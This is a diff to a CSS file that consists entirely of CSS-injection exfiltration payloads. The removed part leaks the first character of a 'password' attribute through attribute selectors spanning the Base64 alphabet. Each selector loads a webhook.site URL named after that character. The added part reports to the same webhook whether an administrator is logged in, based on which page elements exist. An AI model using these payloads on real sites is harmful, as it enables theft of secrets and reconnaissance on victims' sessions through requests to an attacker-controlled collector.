@@ -1,68 +1,9 @@
-/* Base64 charset + URL-safe */
-body[password^="A"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-A")}
-body[password^="B"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-B")}
-body[password^="C"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-C")}
-body[password^="D"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-D")}
-body[password^="E"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-E")}
-body[password^="F"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-F")}
-body[password^="G"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-G")}
-body[password^="H"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-H")}
-body[password^="I"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-I")}
-body[password^="J"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-J")}
-body[password^="K"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-K")}
-body[password^="L"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-L")}
-body[password^="M"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-M")}
-body[password^="N"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-N")}
-body[password^="O"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-O")}
-body[password^="P"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-P")}
-body[password^="Q"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-Q")}
-body[password^="R"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-R")}
-body[password^="S"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-S")}
-body[password^="T"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-T")}
-body[password^="U"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-U")}
-body[password^="V"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-V")}
-body[password^="W"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-W")}
-body[password^="X"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-X")}
-body[password^="Y"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-Y")}
-body[password^="Z"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-Z")}
+/* If .loginbox exists: admin is likely not logged in */
+.loginbox {
+  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/state-not-logged-in");
+}
 
-body[password^="a"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-a")}
-body[password^="b"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-b")}
-body[password^="c"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-c")}
-body[password^="d"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-d")}
-body[password^="e"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-e")}
-body[password^="f"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-f")}
-body[password^="g"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-g")}
-body[password^="h"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-h")}
-body[password^="i"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-i")}
-body[password^="j"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-j")}
-body[password^="k"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-k")}
-body[password^="l"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-l")}
-body[password^="m"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-m")}
-body[password^="n"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-n")}
-body[password^="o"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-o")}
-body[password^="p"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-p")}
-body[password^="q"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-q")}
-body[password^="r"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-r")}
-body[password^="s"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-s")}
-body[password^="t"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-t")}
-body[password^="u"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-u")}
-body[password^="v"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-v")}
-body[password^="w"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-w")}
-body[password^="x"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-x")}
-body[password^="y"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-y")}
-body[password^="z"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-z")}
-
-body[password^="0"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-0")}
-body[password^="1"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-1")}
-body[password^="2"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-2")}
-body[password^="3"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-3")}
-body[password^="4"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-4")}
-body[password^="5"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-5")}
-body[password^="6"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-6")}
-body[password^="7"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-7")}
-body[password^="8"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-8")}
-body[password^="9"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-9")}
-
-body[password^="+"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-plus")}
-body[password^="/"]{background-image:url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/token1-slash")}
+/* Check for an element that appears only when logged in */
+.logout, .dashboard, .admin-panel, #logout, #admin-panel {
+  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/state-logged-in");
+}
